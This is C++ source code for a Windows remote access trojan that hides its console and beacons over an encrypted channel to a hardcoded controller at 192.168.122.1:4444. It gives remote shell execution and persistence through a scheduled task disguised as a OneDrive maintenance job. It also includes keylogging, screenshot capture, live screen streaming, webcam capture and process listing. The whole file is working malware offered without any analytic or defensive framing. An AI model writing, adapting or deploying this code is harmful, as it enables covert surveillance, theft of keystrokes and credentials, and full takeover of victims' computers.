#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>
#include <sstream>
#include <algorithm>
#include <random>
#include <tlhelp32.h>
#include <vfw.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "vfw32.lib")

#define HOST "192.168.122.1"
#define PORT 4444

static const unsigned char KEY[32] = {
    'A','p','a','t','h','y','K','e','y','2','0','2','6','!','!','A',
    'p','a','t','h','y','K','e','y','2','0','2','6','!','!','!','!'
};

std::string JsonEscape(const std::string& s) {
    std::string out;
    for (unsigned char c : s) {
        if (c == '"') out += "\\\"";
        else if (c == '\\') out += "\\\\";
        else if (c == '\n') out += "\\n";
        else if (c == '\r') out += "\\r";
        else if (c == '\t') out += "\\t";
        else if (c < 0x20) {
            char buf[8];
            sprintf(buf, "\\u%04x", c);
            out += buf;
        } else out += c;
    }
    return out;
}

std::string Base64Encode(const std::vector<unsigned char>& data) {
    static const char* tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(tbl[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(tbl[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

std::string Sha256Keystream(const unsigned char* key, DWORD counter, size_t len) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    std::string ks(len, 0);
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return ks;
    unsigned char block[32];
    size_t pos = 0;
    while (pos < len) {
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) break;
        CryptHashData(hHash, key, 32, 0);
        CryptHashData(hHash, (BYTE*)&counter, 4, 0);
        DWORD sz = 32;
        CryptGetHashParam(hHash, HP_HASHVAL, block, &sz, 0);
        CryptDestroyHash(hHash);
        size_t copy = std::min(static_cast<size_t>(32), len - pos);
        memcpy(&ks[pos], block, copy);
        pos += copy;
        counter++;
    }
    CryptReleaseContext(hProv, 0);
    return ks;
}

std::string Encrypt(const std::string& plain) {
    static DWORD ctr = 0x1337;
    std::string ks = Sha256Keystream(KEY, ctr++, plain.size());
    std::string out = plain;
    for (size_t i = 0; i < plain.size(); i++) out[i] ^= ks[i];
    return out;
}

std::string Decrypt(const std::string& cipher) {
    static DWORD ctr = 0x1337;
    std::string ks = Sha256Keystream(KEY, ctr++, cipher.size());
    std::string out = cipher;
    for (size_t i = 0; i < cipher.size(); i++) out[i] ^= ks[i];
    return out;
}

std::string Exec(const std::string& cmd) {
    std::string result;
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "pipe fail";
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    PROCESS_INFORMATION pi = {};
    std::string full = "cmd.exe /c " + cmd;
    if (CreateProcessA(NULL, (LPSTR)full.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);
        char buf[4096];
        DWORD read;
        while (ReadFile(hRead, buf, sizeof(buf)-1, &read, NULL) && read) {
            buf[read] = 0;
            result += buf;
        }
        WaitForSingleObject(pi.hProcess, 20000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        CloseHandle(hWrite);
        result = "createprocess fail";
    }
    CloseHandle(hRead);
    return result.empty() ? "[empty]" : result;
}

bool IsAdmin() {
    BOOL admin = FALSE;
    HANDLE token = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elev = {};
        DWORD sz = 0;
        if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &sz))
            admin = elev.TokenIsElevated;
        CloseHandle(token);
    }
    return admin;
}

bool Persist() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string rl = IsAdmin() ? "highest" : "limited";
    std::string cmd = "schtasks /create /tn \"OneDrive Sync Maintenance\" /tr \"" + std::string(path) + "\" /sc onlogon /rl " + rl + " /f";
    Exec(cmd);
    return true;
}

std::string TakeScreenshot() {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, w, h);
    SelectObject(hdcMem, hbm);
    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    int stride = ((w * 3 + 3) & ~3);
    std::vector<unsigned char> pixels(stride * h);
    GetDIBits(hdcMem, hbm, 0, h, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    std::vector<unsigned char> bmp;
    BITMAPFILEHEADER bfh = {};
    bfh.bfType = 0x4D42;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize = bfh.bfOffBits + pixels.size();
    bmp.insert(bmp.end(), (unsigned char*)&bfh, (unsigned char*)&bfh + sizeof(bfh));
    bmp.insert(bmp.end(), (unsigned char*)&bi, (unsigned char*)&bi + sizeof(bi));
    bmp.insert(bmp.end(), pixels.begin(), pixels.end());

    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    return "IMG:" + Base64Encode(bmp);
}

std::string TakeWebcam() {
    HWND hCam = capCreateCaptureWindowA("cam", WS_CHILD, 0, 0, 320, 240, GetDesktopWindow(), 0);
    if (!hCam) return "webcam fail: no window";
    if (!capDriverConnect(hCam, 0)) {
        DestroyWindow(hCam);
        return "webcam fail: no device";
    }
    capGrabFrame(hCam);
    capEditCopy(hCam);
    capDriverDisconnect(hCam);
    DestroyWindow(hCam);

    if (!OpenClipboard(NULL)) return "webcam fail: clipboard";
    HANDLE hData = GetClipboardData(CF_DIB);
    if (!hData) { CloseClipboard(); return "webcam fail: no dib"; }
    void* p = GlobalLock(hData);
    DWORD sz = GlobalSize(hData);
    std::vector<unsigned char> dib((unsigned char*)p, (unsigned char*)p + sz);
    GlobalUnlock(hData);
    CloseClipboard();

    BITMAPFILEHEADER bfh = {};
    bfh.bfType = 0x4D42;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize = bfh.bfOffBits + dib.size() - sizeof(BITMAPINFOHEADER);
    std::vector<unsigned char> bmp;
    bmp.insert(bmp.end(), (unsigned char*)&bfh, (unsigned char*)&bfh + sizeof(bfh));
    bmp.insert(bmp.end(), dib.begin(), dib.end());
    return "IMG:" + Base64Encode(bmp);
}

std::string ProcList() {
    std::string out;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "proclist fail";
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            char line[256];
            sprintf(line, "%5lu  %s\n", pe.th32ProcessID, pe.szExeFile);
            out += line;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return out.empty() ? "[empty]" : out;
}

std::string keylog;
HANDLE hKeyThread = NULL;
volatile bool keylogRunning = false;

DWORD WINAPI KeylogThread(LPVOID) {
    while (keylogRunning) {
        for (int vk = 8; vk <= 255; vk++) {
            if (GetAsyncKeyState(vk) & 1) {
                char c = (char)MapVirtualKeyA(vk, MAPVK_VK_TO_CHAR);
                if (c >= 32 && c < 127) keylog += c;
                else if (vk == VK_RETURN) keylog += "\n";
                else if (vk == VK_SPACE) keylog += " ";
                else if (vk == VK_BACK) keylog += "[BS]";
                else {
                    char buf[16];
                    sprintf(buf, "[%02X]", vk);
                    keylog += buf;
                }
            }
        }
        Sleep(10);
    }
    return 0;
}

void KeylogStart() {
    if (keylogRunning) return;
    keylogRunning = true;
    hKeyThread = CreateThread(NULL, 0, KeylogThread, NULL, 0, NULL);
}

void KeylogStop() {
    keylogRunning = false;
    if (hKeyThread) {
        WaitForSingleObject(hKeyThread, 2000);
        CloseHandle(hKeyThread);
        hKeyThread = NULL;
    }
}

bool SendData(SOCKET s, const std::string& data, DWORD& ctr) {
    std::string ks = Sha256Keystream(KEY, ctr, data.size());
    ctr += (DWORD)((data.size() + 31) / 32);
    std::string enc = data;
    for (size_t i = 0; i < data.size(); i++) enc[i] ^= ks[i];
    DWORD len = htonl((DWORD)enc.size());
    if (send(s, (char*)&len, 4, 0) != 4) return false;
    int sent = 0;
    while (sent < (int)enc.size()) {
        int r = send(s, enc.c_str() + sent, (int)enc.size() - sent, 0);
        if (r <= 0) return false;
        sent += r;
    }
    return true;
}

std::string RecvData(SOCKET s, DWORD& ctr) {
    DWORD len = 0;
    int r = recv(s, (char*)&len, 4, 0);
    if (r != 4) return "";
    len = ntohl(len);
    if (len == 0 || len > 16*1024*1024) return "";
    std::string buf(len, 0);
    DWORD got = 0;
    while (got < len) {
        r = recv(s, &buf[got], len - got, 0);
        if (r <= 0) return "";
        got += r;
    }
    std::string ks = Sha256Keystream(KEY, ctr, buf.size());
    ctr += (DWORD)((buf.size() + 31) / 32);
    for (size_t i = 0; i < buf.size(); i++) buf[i] ^= ks[i];
    return buf;
}

void Hide() {
    HWND console = GetConsoleWindow();
    if (console) ShowWindow(console, SW_HIDE);
    FreeConsole();
    CreateMutexA(NULL, FALSE, "Global\\OneDriveSyncMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) ExitProcess(0);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    Hide();
    std::mt19937 rng(GetTickCount());
    std::uniform_int_distribution<int> delay(20, 80);
    Sleep(delay(rng) * 1000);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    while (true) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        if (s == INVALID_SOCKET) { Sleep(5000); continue; }

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        addr.sin_addr.s_addr = inet_addr(HOST);

        if (connect(s, (sockaddr*)&addr, sizeof(addr)) == 0) {
            DWORD send_ctr = 0x1337;
            DWORD recv_ctr = 0x1337;
            std::string user = getenv("USERNAME") ? getenv("USERNAME") : "?";
            std::string host = getenv("COMPUTERNAME") ? getenv("COMPUTERNAME") : "?";
            std::string info = "{\"u\":\"" + JsonEscape(user) + "\",\"h\":\"" + JsonEscape(host) + "\",\"a\":" + (IsAdmin() ? "1" : "0") + "}";
            if (!SendData(s, info, send_ctr)) { closesocket(s); goto recon; }

            while (true) {
                std::string cmd = RecvData(s, recv_ctr);
                if (cmd.empty()) break;

                std::string reply;
                if (cmd == "ping") reply = "pong";
                else if (cmd == "info") reply = info;
                else if (cmd == "persist") { Persist(); reply = "ok"; }
                else if (cmd == "screenshot") reply = TakeScreenshot();
                else if (cmd == "webcam") reply = TakeWebcam();
                else if (cmd == "proclist") reply = ProcList();
                else if (cmd == "keylog_start") { KeylogStart(); reply = "keylog started"; }
                else if (cmd == "keylog_stop") { KeylogStop(); reply = "keylog stopped"; }
                else if (cmd == "keylog_dump") reply = keylog.empty() ? "[empty]" : keylog;
                else if (cmd == "keylog_clear") { keylog.clear(); reply = "cleared"; }
                else if (cmd == "stream_start") {
                    if (!SendData(s, "stream started", send_ctr)) break;
                    u_long nb = 1;
                    ioctlsocket(s, FIONBIO, &nb);
                    while (true) {
                        fd_set rfds;
                        FD_ZERO(&rfds);
                        FD_SET(s, &rfds);
                        timeval tv{0, 20000};
                        int sel = select(0, &rfds, NULL, NULL, &tv);
                        if (sel > 0) {
                            DWORD len = 0;
                            int r = recv(s, (char*)&len, 4, 0);
                            if (r == 4) {
                                len = ntohl(len);
                                if (len > 0 && len < 1024) {
                                    std::string buf(len, 0);
                                    DWORD got = 0;
                                    while (got < len) {
                                        r = recv(s, &buf[got], len - got, 0);
                                        if (r <= 0) break;
                                        got += r;
                                    }
                                    if (got == len) {
                                        std::string ks = Sha256Keystream(KEY, recv_ctr, buf.size());
                                        recv_ctr += (DWORD)((buf.size() + 31) / 32);
                                        for (size_t i = 0; i < buf.size(); i++) buf[i] ^= ks[i];
                                        if (buf == "stream_stop") break;
                                    }
                                }
                            } else if (r <= 0) break;
                        }
                        std::string frame = TakeScreenshot();
                        if (frame.size() < 5) continue;
                        if (!SendData(s, "FRAME:" + frame.substr(4), send_ctr)) break;
                        Sleep(40);
                    }
                    nb = 0;
                    ioctlsocket(s, FIONBIO, &nb);
                    reply = "stream stopped";
                }
                else if (cmd.rfind("sh:", 0) == 0) reply = Exec(cmd.substr(3));
                else reply = "unknown";

                if (!SendData(s, reply, send_ctr)) break;
            }
            closesocket(s);
        } else closesocket(s);

    recon:
        std::uniform_int_distribution<int> recon(8, 20);
        Sleep(recon(rng) * 1000);
    }
    WSACleanup();
    return 0;
}
